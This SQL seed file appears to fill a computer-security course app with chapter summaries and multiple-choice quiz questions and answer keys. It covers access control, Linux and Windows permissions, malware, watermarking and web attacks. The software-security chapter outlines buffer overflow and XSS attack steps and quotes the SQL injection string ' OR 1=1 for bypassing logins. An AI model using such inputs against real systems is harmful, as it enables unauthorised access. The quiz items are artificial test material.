INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'Which Windows user-mode component is specifically responsible for password verification, generating access tokens, and handling audit logs?', '["The Local Security Authority (LSA)","The Reference Monitor","Active Directory","The Security Accounts Manager (SAM)"]', 0, 'The Local Security Authority (LSA).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'In Linux, what does the octal permission `644` translate to in text format?', '["r--r--r--","rw-r--r--","rwxr--r--","rw-rw-r--"]', 1, '`rw-r--r--` (Owner: read/write, Group: read-only, Others: read-only).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'Define what an Access Control Entry (ACE) does in Windows.', '["A list of all users on the system","A password hash record","A Linux file permission bit","An ACL entry defining allow or deny permissions for a specific principal SID"]', 3, 'An individual entry within an ACL that defines positive (allow) or negative (deny) permissions for a specific principal SID.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'True or False: UNIX was designed from the ground up with a comprehensive, unified security architecture.', '["True","False"]', 1, 'False. UNIX explicitly does *not* have a security architecture; its design goals were modularity, portability, and efficiency.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'What is the purpose of the `umask` command in Linux?', '["It encrypts new files","It masks out bits from the default permissions of newly created files","It grants root access to a user","It lists active processes"]', 1, 'It changes the default permissions for newly created files and directories by masking out specific bits.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'Within a Windows Security Descriptor, which component explicitly specifies who is granted and who is denied access to an object?', '["The System Access Control List (SACL)","The Owner SID","The Discretionary Access Control List (DACL)","The Primary Group SID"]', 2, 'The Discretionary Access Control List (DACL).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'What is the difference between a *real* UID and an *effective* UID in Linux?', '["Real UID is inherited from the parent; effective UID may come from the parent or a SUID file owner","Real UID comes from SUID; effective UID from the parent","They are always identical","Effective UID is always 0"]', 0, 'The *real* UID is always inherited from the parent process. The *effective* UID can be inherited from the parent OR from the owner of the executed file if the SUID flag is present.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'Name three components found within a Windows Object Security Descriptor.', '["inode, umask, SUID","Owner SID, DACL, SACL","LSA, SAM, UAC","TGT, TGS, AS"]', 1, 'Any three of: Owner SID, Primary Group SID, DACL, SACL.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'What does the "Sticky flag" do when applied to a directory in Linux?', '["Only the file owner (or root) may remove files in that directory","It hides the directory","It makes the directory read-only","It runs files with owner privilege"]', 0, 'It ensures that only the owner of a file (or root) is permitted to remove files within that directory.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'A Linux user writes a new script. The OS default permission for programs is `777`. If the administrator has set the system''s `umask` to `027`, what will the final octal permission of the newly created script be, and what does this mean in plain English for the Owner, Group, and Others?', '["750: owner rwx, group r-x, others none","640: owner rw-, group r--, others none","755: owner rwx, group r-x, others r-x","777: full access for everyone"]', 0, 'The final octal permission will be `750`. This means the Owner has full read/write/execute access (`7` or `rwx`), the Group has read and execute access (`5` or `r-x`), and Others have absolutely no access (`0` or `---`).');

INSERT INTO chapters (number, title, variant, content_md) VALUES (5, 'Software & Web Security', 'standard', '**1. Overview**
This chapter covers the critical vulnerabilities and protective measures at the application layer. It matters because it explores how malicious software (malware) and input validation failures (such as buffer overflows and SQL injection) can completely compromise system security. Furthermore, it details how stateless web protocols are exploited via cross-site scripting (XSS) and cross-site request forgery (CSRF), and concludes with how digital watermarking is utilised to protect copyright and verify the integrity of digital media. Understanding these concepts is essential for defending against the most prevalent application-level attacks.

**2. Key Terms**
*   **Malware:** Program code executed without a user’s consent that carries out harmful functionality [Slide 555].
*   **Virus:** Malware that copies itself to other files and needs a host file to propagate and execute [Slide 576].
*   **Worm:** Malware that exploits network vulnerabilities to spread independently over a network [Slide 576].
*   **Buffer Overflow:** A vulnerability where a lack of bounds checking allows data to overspill into adjacent stack memory, potentially hijacking the execution flow [Slides 585, 587].
*   **Code Injection:** Tricking a program into executing an attacker''s code by cleverly manipulating input to mix code and data [Slide 600].
*   **Cross-Site Scripting (XSS):** A vulnerability where unvalidated user input is reflected by a web application, allowing the execution of arbitrary Javascript in a victim''s browser [Slides 628, 630].
*   **Cross-Site Request Forgery (CSRF / XSRF):** An attack that tricks a victim''s browser into sending a forged request using existing, active authorisation credentials (like session cookies) [Slides 637, 639].
*   **Digital Watermark:** A digital signal or pattern covertly inserted into a document that carries information unique to the copyright owner or authorised consumer [Slides 648, 651].
*   **Least Significant Bit (LSB):** A spatial watermarking technique where the lowest-order bits of pixels or bytes are altered to hide data with minimal visual distortion [Slides 665, 666].

**3. Processes & Models**
**Malware Incident Handling Steps**
1. **Preparation** (Steady State)
2. **Identification** (Declare an Incident)
3. **Containment** 
4. **Eradication** (Start Clean-Up)
5. **Recovery** (Finish Clean-Up, Back in Production)
6. **Lessons Learned**

**Stack Buffer Overflow Attack Sequence**
1. Identify a vulnerable function (e.g. `strcpy()`) that copies input into a local buffer without checking the string''s length.
2. Input a string larger than the allocated buffer.
3. Overflow the adjacent memory, specifically targeting the **return address** within the stack frame.
4. Overwrite the return address with a guessed pointer to the attacker''s own code (e.g. `exec("/bin/sh")`) placed inside the stack.
5. When the function exits, the execution flow is hijacked to run the attacker''s code.

**Cross-Site Scripting (XSS) Attack Sequence**
1. The attacker inserts a malicious script (e.g. via a form) into a website''s database.
2. The victim requests a page from the infected website.
3. The website includes the malicious script from the database in the response sent to the victim.
4. The victim''s browser executes the malicious script, often sending sensitive data (like cookies) back to the attacker''s server.

**LSB Checksum Watermarking Algorithm**
1. Randomly choose eight pixels to hold one bit each of a checksum.
2. Form a 56-bit checksum by concatenating the 7 most significant bits of each chosen pixel.
3. Replace the Least Significant Bit (LSB) of each pixel with the corresponding checksum bit to embed the watermark.

**4. Most Examinable Points**
*   **You must know** that the primary source of software insecurity is the failure to validate and sanitise user input.
*   **You must know** the fundamental difference between a virus (requires a host file to propagate) and a worm (exploits vulnerabilities to spread independently).
*   **You must know** that a buffer overflow exploits the stack''s "bottom-up" allocation by overwriting the return address.
*   **You must know** the three defensive mechanisms against stack exploits: Data Execution Protection (DEP), Address Space Layout Randomisation (ASLR), and Canaries.
*   **You must know** that XSS allows the execution of arbitrary Javascript in a user''s browser because the application reflects user input without filtering.
*   **You must know** that SQL Injection bypasses authentication or alters queries by manipulating input (e.g. using `'' OR 1=1`), and is defended against using parameterised input and input sanitisation.
*   **You must know** the difference between spatial watermarking (changing pixel values like LSB) and frequency domain watermarking (applying watermarks in low-frequency redundant data areas).
*   **You must know** that watermarking attacks (like Jitter or StirMark) aim to produce media very similar to the original while successfully destroying or confusing the watermark detector.

**5. Common Mistakes**
*   **Confusing Viruses and Worms:** Students frequently mix these up. Remember: a virus *requires a host file* and user interaction to spread. A worm spreads *independently* across a network.
*   **Misunderstanding XSS vs. CSRF:** XSS involves injecting malicious *scripts* that execute in the victim''s browser. CSRF involves forging *requests* from a victim''s browser to exploit their existing authenticated session (e.g. an active banking login).
*   **Assuming Encryption and Watermarking are the same:** Encryption transforms a document to make it unreadable without a key. Watermarking leaves the original file intact and readable, merely hiding a copyright or integrity marker within it.
*   **Thinking LSB Watermarking is robust:** Students sometimes assume LSB is highly secure. In reality, it is extremely fragile; the entire watermark can be destroyed simply by removing the LSB plane or using lossy compression.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'Define "Malware" according to the slides.', '["Any program that uses the network","A legally licensed application","Software with a graphical interface","Program code executed without the user''s consent that carries out harmful functionality"]', 3, 'Program code executed without a user''s consent and carrying out harmful functionality.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'What is the fundamental difference between a Trojan Horse and a Rootkit?', '["A Rootkit masquerades as a game; a Trojan hides files","A Trojan masquerades as helpful software; a Rootkit hides processes and maintains privileged access","A Trojan spreads over the network; a Rootkit needs a host file","They are the same thing"]', 1, 'A Trojan Horse masquerades as a helpful or harmless program to steal data or install malware, whereas a Rootkit is designed specifically to mask malicious processes and maintain hidden, privileged remote access.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'Name the three security mechanisms that protect the stack against buffer overflow attacks.', '["DEP, SQL parameterisation, XSS filtering","Data Execution Protection, Address Space Layout Randomisation, Canaries","Firewalls, VPNs, IDS","Encryption, Hashing, Salting"]', 1, 'Data Execution Protection (DEP), Address Space Layout Randomisation (ASLR), and Canaries.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'What specific component of a stack frame does a buffer overflow attacker aim to overwrite to hijack the execution flow?', '["The heap pointer","The function name","The return address","The program counter register"]', 2, 'The return address.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'In web security, what does CSRF stand for, and what does it exploit?', '["Client-Side Request Filtering; it blocks cookies","Cross-Site Request Forgery; it exploits an existing authenticated session","Cross-Site Resource Fetch; it steals files","Cross-Site Reflected Forgery; it injects scripts"]', 1, 'Cross-Site Request Forgery. It exploits an existing authenticated session (like an active session cookie) by tricking the browser into sending a forged request.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'How does a SQL injection attack bypass a password check using the string `'' OR 1=1`?', '["It makes the query condition always true (1=1), granting access without a valid password","It deletes the password table","It encrypts the query","It overflows the login buffer"]', 0, 'It modifies the SQL query so that the password check evaluates to true (since 1=1 is always true), permitting access even if the password field is blank.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'What is the main difference between encryption and digital watermarking?', '["Both make the document unreadable","Encryption makes a document unreadable without a key; watermarking leaves it intact with a hidden marker","Encryption hides a copyright marker inside the file","Watermarking needs a key; encryption does not"]', 1, 'Encryption transforms a document to make it unreadable without a key, whereas watermarking leaves the original document intact and recognisable.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'Name three characteristics (requirements) of a good digital watermark.', '["Any three of: Unobtrusive, Readily Detectable, Unambiguous, Innumerable, Robust","Encrypted, Compressed, Signed","Visible, Removable, Editable","Fast, Cheap, Small"]', 0, 'Any three of: Unobtrusive, Readily Detectable, Unambiguous, Innumerable, Robust.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'What is a "Jitter attack" in the context of digital watermarking?', '["It floods the detector with requests","It overflows the media buffer","It encrypts the watermark","It tweaks lower-order bits and adds jitter to stop watermark bits being located, keeping the object intact"]', 3, 'An attack that tweaks lower-order bits and adds jitter (e.g. duplicating or deleting signal segments at random) to prevent watermarked bits from being located, whilst keeping the object more or less intact.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'Your company''s web application takes a user''s search term and immediately displays "You searched for: [term]" on the page without any filtering. What specific type of vulnerability is this, and what could an attacker execute in the victim''s browser?', '["SQL Injection; the attacker could drop tables","Cross-Site Scripting (XSS); the attacker could run arbitrary JavaScript to steal session cookies","CSRF; the attacker could forge a bank transfer","Buffer overflow; the attacker could overwrite the return address"]', 1, 'Cross-Site Scripting (XSS). An attacker could inject arbitrary Javascript (e.g. `<script>...</script>`) which would execute in the victim''s browser, potentially stealing sensitive data like session cookies.');

INSERT INTO chapters (number, title, variant, content_md) VALUES (1, 'Introduction to Computer Security', 'extended', '**1. Overview**
This chapter provides a foundational understanding of computer security, focusing on the core principles, objectives, and mechanisms used to protect organisational assets. It is critical because it establishes the baseline vocabulary and frameworks—such as the CIA triad plus Authentication and Accountability, threat classifications, security life cycle, and risk analysis—that will inform all subsequent technical and non-technical security strategies in your module.

**2. Key Terms**
*   **Security:** Protection of organisational assets (physical devices, software, data, intellectual property, and business reputation) [Slide 2/30].
*   **Asset Valuation:** Determining what assets are worth, usually via monetary replacement value or lost revenue [Slide 3/30].
*   **Policy:** Specifies what security we want to achieve [Slide 5/30].
*   **Mechanism:** The methods which can be used to fulfil the policy requirements; the "implementation" of security [Slide 5/30].
*   **Confidentiality:** No information has been inappropriately disclosed [Slide 7/30].
*   **Integrity:** Data has not been (maliciously) altered [Slide 7/30].
*   **Availability:** Data/services can be accessed as desired [Slide 7/30].
*   **Authentication:** User or data origin is properly identifiable [Slide 8/30].
*   **Authorisation:** Permission to do or have something [Slide 8/30].
*   **Accountability:** Actions are traceable to those responsible [Slide 8/30].
*   **Vulnerabilities:** Weakness of a system that can be exploited to damage assets [Slide 9/30].
*   **Threat:** A "potential" violation of security; an entity representing a constant danger to an asset [Slides 9/30, 28/30].
*   **Attack:** The actual violation of security; a deliberate act that exploits a vulnerability [Slides 9/30, 28/30].

**3. Processes & Models**

**Security Life Cycle**
1. Threats
2. Policy
3. Specification
4. Design
5. Implementation
6. Operation & Maintenance

**The Onion Model (Layered Security)**
*(From innermost layer to outermost layer)*
1. Hardware (tamper-resistant hardware modules, e.g., for PKI)
2. OS kernel (security models at hardware abstraction level)
3. Operating system (main OS security mechanisms)
4. Services (security of services such as DNS, DHCP)
5. Applications (application-level protection mechanisms)

**4. Most Examinable Points**
*   **You must know** the difference between a vulnerability (a weakness), a threat (a potential violation), and an attack (an actual deliberate violation).
*   **You must know** the five core security objectives that classify protection mechanisms: Confidentiality, Integrity, Availability, Authentication, and Accountability.
*   **You must know** the mathematical function for Risk: `Risk = Assets x Vulnerabilities x Threats`.
*   **You must know** the difference between Quantitative risk analysis (using mathematical domains like price/probability to calculate expected loss) and Qualitative risk analysis (ad-hoc advice by security experts without mathematical structure).
*   **You must know** the three broad enterprise security threat sources: Act of Human Error or Failure, Forces of Nature, and Deviation in Quality of Services.
*   **You must know** the four Classes of Threats and how they map to specific attacks: Disclosure (snooping, sniffing, wiretapping), Deception (modification, spoofing, repudiation of origin, denial of receipt), Disruption (modification), and Usurpation (modification, spoofing, delay, denial of service).
*   **You must know** how security services map to (counter) threat classes: Confidentiality counters Disclosure; Integrity counters Deception and Disruption; Availability counters Usurpation.
*   **You must know** the three functions of Instruments/Mechanisms: Prevention (by design), Detection (timely discovery and diagnosis), and Recovery/Reaction (restoring and upgrading).
*   **You must know** the three classifications of Instruments/Mechanisms: Non-technical (locks, burglar alarms), Semi-technical (SSL, credit card validation), and Technical (vulnerability scanning, firewalls, IDS).
*   **You must know** the ten Security Design Principles: Economy of mechanism (keep it simple), Fail-safe defaults (when in doubt, do not grant access), Open design (no "security by obscurity"), Separation of privilege (don’t make it root/admin), Least privilege (minimum access rights necessary), Complete mediation, Least common mechanism, Psychological acceptability, Work factor, and Compromise recording.
*   **You must know** the two strategies for Defence-in-Depth: Layered protection (defence in multiple places) and Diversification (use of complementary products).
*   **You must know** the two strategies for Compartmentalisation: Sensitivity/privilege differentiation and Information hiding (disclose only information needed for a specific service).
*   **You must know** the Security Quadrilema, which illustrates the constant trade-offs between Security, Cost, Functionality, and User expertise.

**5. Common Mistakes**
*   **Reversing Threat Class Counters:** Students frequently state that threats "counter" security services. It is the exact opposite: the security services (Confidentiality, Integrity, Availability) are used to *counter* the threats (Disclosure, Deception, Disruption, Usurpation).
*   **Confusing Threats, Vulnerabilities, and Attacks:** Using these terms interchangeably is a major error. A vulnerability is the *weakness*, a threat is the *potential* danger to the asset, and an attack is the *actual deliberate act*.
*   **Mixing up Policy and Mechanism:** Policy specifies *what* security you want to achieve (the rules), while mechanism is *how* you implement it (the methods fulfilling the requirements).
*   **Ignoring Non-Malicious Threats:** Focusing entirely on hackers. The slides explicitly outline "Acts of Human Error or Failure" and "Forces of Nature" as among the greatest/most dangerous threats to an organisation.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What does the CIA triad stand for?', '["Cryptography, Integrity, Authentication","Control, Identity, Access","Confidentiality, Identity, Authorisation","Confidentiality, Integrity, Availability"]', 3, 'Confidentiality, Integrity, and Availability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Which two objectives were added "Beyond The CIA Triad" to form the five main security objectives?', '["Authorisation and Auditing","Privacy and Cost","Authentication and Accountability","Prevention and Recovery"]', 2, 'Authentication and Accountability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Define "Mechanism" in the context of computer security.', '["The monetary value of an asset","The rules specifying what security to achieve","The methods used to fulfil policy requirements; the implementation of security","A potential violation of security"]', 2, 'The methods which can be used to fulfil policy requirements; the "implementation" of security.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Explain the difference between a Threat and a Vulnerability.', '["A vulnerability is a deliberate act; a threat is a flaw","A vulnerability is a weakness; a threat is a potential violation of security","A threat is a weakness; a vulnerability is the actual attack","They mean the same thing"]', 1, 'A vulnerability is a weakness in the system, whereas a threat is a "potential" violation of security representing a constant danger.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the two types of Asset Valuation listed in the slides?', '["Price and probability","Hardware cost and software cost","Monetary replacement value and lost revenue","Asset count and threat count"]', 2, 'Monetary replacement value and Lost revenue.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What is the mathematical formula for evaluating Risk?', '["Risk = Vulnerabilities x Cost","Risk = Threats / Controls","Risk = Assets + Threats","Risk = Assets x Vulnerabilities x Threats"]', 3, 'Risk = Assets x Vulnerabilities x Threats.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Differentiate between Quantitative and Qualitative risk analysis.', '["Quantitative ignores cost; Qualitative ignores probability","Quantitative uses price and probability for expected loss; Qualitative uses ad-hoc expert advice","Both are purely mathematical","Quantitative uses expert opinion; Qualitative uses formulas"]', 1, 'Quantitative analysis uses values from a mathematical domain (price and probability) to calculate an expected loss, while Qualitative analysis relies on ad-hoc advice by security experts without mathematical structure.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the three broad categories of Enterprise Security Threats?', '["Disclosure, Deception, Disruption","Prevention, Detection, Recovery","Hardware, Software, Network","Act of Human Error or Failure, Forces of Nature, Deviation in Quality of Services"]', 3, 'Act of Human Error or Failure, Forces of Nature, and Deviation in Quality of Services.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Which specific security service counters the "Deception" threat class?', '["Integrity","Confidentiality","Availability","Authentication"]', 0, 'Integrity services.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Give two examples of attacks that fall under the "Disclosure" threat class.', '["Snooping, sniffing, wiretapping","Modification and delay","Spoofing and repudiation","Denial of service and replay"]', 0, 'Snooping, sniffing, or wiretapping.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the three functions of security instruments/mechanisms?', '["Prevention, Detection, Recovery/Reaction","Confidentiality, Integrity, Availability","Identify, Protect, Respond","Policy, Mechanism, Audit"]', 0, 'Prevention, Detection, and Recovery/Reaction.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Give an example of a "Semi-technical" prevention mechanism.', '["SSL encryption or credit card validation","Firewalls and IDS","Burglar alarms and locks","Vulnerability scanning"]', 0, 'SSL encryption or credit card validation.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What does the "Fail-safe defaults" security design principle mean?', '["When in doubt, do not grant access","Grant access unless explicitly denied","No security by obscurity","Keep the mechanism simple"]', 0, 'When in doubt, do not grant access.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What does the "Open design" security design principle mean?', '["Keep designs hidden from attackers","Use minimum necessary privileges","When in doubt, deny access","No security by obscurity"]', 3, 'No "security by obscurity".');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the two core elements of a "Defence-in-Depth" strategy?', '["Sensitivity differentiation and Information hiding","Layered protection and Diversification","Prevention and Detection","Confidentiality and Integrity"]', 1, 'Layered protection and Diversification.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the two core elements of a "Compartmentalisation" strategy?', '["Layered protection and Diversification","Economy of mechanism and Open design","Sensitivity/privilege differentiation and Information hiding","Prevention and Recovery"]', 2, 'Sensitivity/privilege differentiation and Information hiding.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What four conflicting elements make up the "Security Quadrilema"?', '["Confidentiality, Integrity, Availability, Accountability","Prevention, Detection, Recovery, Reaction","Security, Cost, Functionality, User expertise","Assets, Vulnerabilities, Threats, Risk"]', 2, 'Security, Cost, Functionality, and User expertise.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'List the five layers of the "Onion Model" starting from the innermost layer.', '["Applications, Services, OS, Kernel, Hardware","Hardware, OS kernel, Operating system, Services, Applications","Hardware, Firmware, Network, OS, Users","Kernel, Hardware, Services, OS, Applications"]', 1, 'Hardware, OS kernel, Operating system, Services, and Applications.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Your organisation evaluates the danger of a server room fire. They calculate that a replacement server costs £10,000, and the probability of a fire is 1% per year, resulting in an expected loss calculation of £100 annually. According to the slides, what specific type of analysis is this?', '["Asset valuation","Defence-in-Depth","Qualitative risk analysis","Quantitative risk analysis"]', 3, 'Quantitative risk analysis.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'A network engineer installs a web application firewall, a network firewall, and local personal firewalls on user workstations. According to the slides, what specific security design strategy is the engineer employing?', '["Compartmentalisation","Separation of privilege","Fail-safe defaults","Defence-in-Depth (Layered protection)"]', 3, 'Defence-in-Depth (specifically Layered protection).');

INSERT INTO chapters (number, title, variant, content_md) VALUES (2, 'Information Security & Access Control', 'extended', '**1. Overview**
Chapter Two shifts from general security concepts to the specific mechanisms and formal theoretical models used to control system access. It covers the entire lifecycle of resource access—from identifying and authenticating a subject, to authorising their actions, and logging the transaction for accountability. This chapter matters because it bridges practical implementations (like biometrics, Kerberos, ACLs, and Capabilities) with the rigorous, formal mathematical models (like Bell-LaPadula, Biba, and the Chinese Wall) that are used to prove a system successfully enforces confidentiality and integrity policies.

**2. Key Terms**
*   **Information Security:** The process of protecting information''s Confidentiality, Integrity, Availability, Accountability, and Privacy [021 Slide 2/9].
*   **Identification:** The process of establishing the identity of someone or something; asking "Who are you?" [022 Slide 2/26].
*   **Authentication:** The process of verifying an identity; demanding "Prove it!" [022 Slide 2/26].
*   **Zero Knowledge protocols:** Authentication protocols where many executions provide NO INFORMATION to an adversarial impersonator [022 Slide 7/26].
*   **Subject:** An active entity that initiates an access request, operating on behalf of principals [023 Slide 5/20].
*   **Object:** An entity to which an access is requested [023 Slide 4/20].
*   **Reference Monitor:** An abstract notion of a mechanism for controlling access requests [023 Slide 6/20].
*   **Group:** A collection of related subjects enabling easy sharing and addition/removal of users [023 Slide 11/20].
*   **Negative permission:** Explicit revocation of access rights [023 Slide 11/20].
*   **Privilege:** A mapping of users to access rights [023 Slide 11/20].
*   **Protection ring:** A hierarchy of access right levels (0: OS kernel, 1: OS, 2: services, 3: user processes) [023 Slide 11/20].
*   **Discretionary Access Control (DAC):** Access control carried out by a resource owner where rights are easily transferred [023 Slide 12/20].
*   **Mandatory Access Control (MAC):** Centralised access control by means of a system-wide policy, where rights are fixed by an Administrator [023 Slide 13/20].
*   **Role Based Access Control (RBAC):** A "logical" layer that links users and allowed resources; a role specifies the need or circumstances in which a user needs a resource [023 Slide 14/20].
*   **Company dataset (CD):** Contains objects related to a single company [024 Slide 22/30].
*   **Conflict of interest class (COI):** Contains datasets of companies in competition [024 Slide 22/30].

**3. Processes & Models**

**The Resource Access Sequence**
1. Identification (Which object $O$ requests access to resource $R$?)
2. Authentication (Is $O$ indeed what it claims to be?)
3. Authorization (Is $O$ authorized to access $R$?)
4. Accountability (Log the transaction access $(O, R)$)

**Kerberos Sequence**
1. Login
2. Send Request
3. Generate TGT
4. Send TGT
5. Generate Authenticator U
6. Send TGS
7. Generating Session Key
8. Send Service Ticket
9. Generate Authenticator S
10. Send U, S
11. Validate U, S
12. Accept Request

**Bell-LaPadula (BLP) Confidentiality Model**
1. **Simple Security Property (ss-Property):** Subject $s$ can read object $o$ iff $L(o) \le L(s)$ and $s$ has permission to read $o$. (Sometimes called "no reads up" rule).
2. ***-Property (star property):** Subject $s$ can write object $o$ iff $L(s) \le L(o)$ and $s$ has permission to write $o$. (Sometimes called "no writes down" rule).

**Biba Integrity Model**
1. **Simple integrity:** modify only if $I(S) \ge I(O)$.
2. **Integrity confinement:** read only if $I(S) \le I(O)$.
3. **Invocation property:** invoke only if $I(S_1) \ge I(S_2)$.

**Chinese Wall Policy Model**
1. **(Chinese Wall) Simple Security Rule:** A subject $s$ can be granted access to an object $o$ only if the object is in the same company datasets as the objects already accessed by $s$ (within the Wall), or belongs to an entirely different conflict of interest class.
2. **(Chinese Wall) *-property:** Write access is only permitted if access is permitted by the simple security rule, and no object can be read which is in a different company dataset than the one for which write access is requested, and contains unsanitized information.

**4. Most Examinable Points**
*   **You must know** the three aspects that contend with each other in information-hiding systems: Security, Robustness, and Capacity.
*   **You must know** the three main objectives of authentication: Correctness, Impersonation prevention, and Protection against transferability.
*   **You must know** the three categories of user authentication: Something you know (passwords), Something you have (smart cards), and Something you are (biometrics/behavioral).
*   **You must know** the four goals of access control: Granting access, Limiting access, Preventing access, and Revoking access.
*   **You must know** the difference between Access Control Lists (ACL) and Capability Lists (C-List). C-Lists are subject-centered, offering easy inheritance but poor overview per object. ACLs are object-centered, offering easy management but poor overview per subject.
*   **You must know** the three core requirements for a Reference Monitor: Tamper-resistance, Complete mediation (guaranteed invocation), and Easiness of verification and testing.
*   **You must know** that Bell-LaPadula strictly models multilevel confidentiality (information flow), while Biba strictly models integrity (trust/information modification).
*   **You must know** that Biba is essentially "B-LP upside-down", characterised by the NRD ("no read down") and NWU ("no write up") rules.
*   **You must know** that the Chinese Wall model is an access control policy in which accesses are dynamically sensitive to the history of past accesses.

**5. Common Mistakes**
*   **Mixing up Bell-LaPadula and Biba rules:** Students frequently swap these logical tests. Remember: BLP protects *secrets* ($L(o) \le L(s)$ to read). Biba protects *trust/integrity* ($I(S) \ge I(O)$ to write).
*   **Confusing Identification and Authentication:** Identification simply claims an identity (e.g. providing a username); Authentication provides the proof of that identity (e.g. providing the password).
*   **Assuming Biba Integrity Levels are Security Levels:** Integrity levels are NOT security levels. Security levels track information *flow* (confidentiality), whereas integrity levels track information *modification* (trustworthiness).
*   **Confusing MAC vs DAC:** Students often think DAC means access is "discretionary" for everyone. It means the *resource owner* executes control. MAC removes owner control, forcing a centralised, administrator-defined policy.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What five properties does Information Security protect?', '["Confidentiality, Integrity, Availability","Identification, Authentication, Authorisation, Accountability, Privacy","Security, Robustness, Capacity, Cost, Speed","Confidentiality, Integrity, Availability, Accountability, Privacy"]', 3, 'Confidentiality, Integrity, Availability, Accountability, and Privacy.');
